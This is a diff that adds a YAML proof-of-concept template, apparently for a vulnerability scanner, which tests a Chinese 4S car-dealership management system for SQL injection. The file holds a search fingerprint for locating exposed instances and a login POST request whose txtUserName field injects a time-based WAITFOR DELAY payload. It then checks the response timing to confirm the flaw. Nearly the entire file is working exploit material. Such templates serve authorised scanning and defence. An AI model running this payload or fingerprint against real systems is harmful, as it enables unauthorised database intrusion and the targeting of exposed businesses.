@@ -1,0 +1,21 @@
+id: poc-yaml-wangdao-4s-management-system-sqli
+info:
+  name: 王道4S管理系统 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 王道汽车4S企业管理系统
+  hunter: web.body="PixelsPerInch"&&web.body="AxBorderStyle"&&web.body="DropTarget"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+  data: ScriptManager1=UpdatePanel3|btnLogin&__EVENTTARGET=btnLogin&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=&ddlUserName=&txtUserName=1';WAITFOR
+    DELAY '0:0:{{.t1}}'--&txtPassWord=1&cbBossedBroadcast=on&txtMACAddr=&__ASYNCPOST=true&
+  expression: "status_code == 200 && \ncontains(body,\"该用户不存在！\") && \ncontains(body,\"\
+    进入系统\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
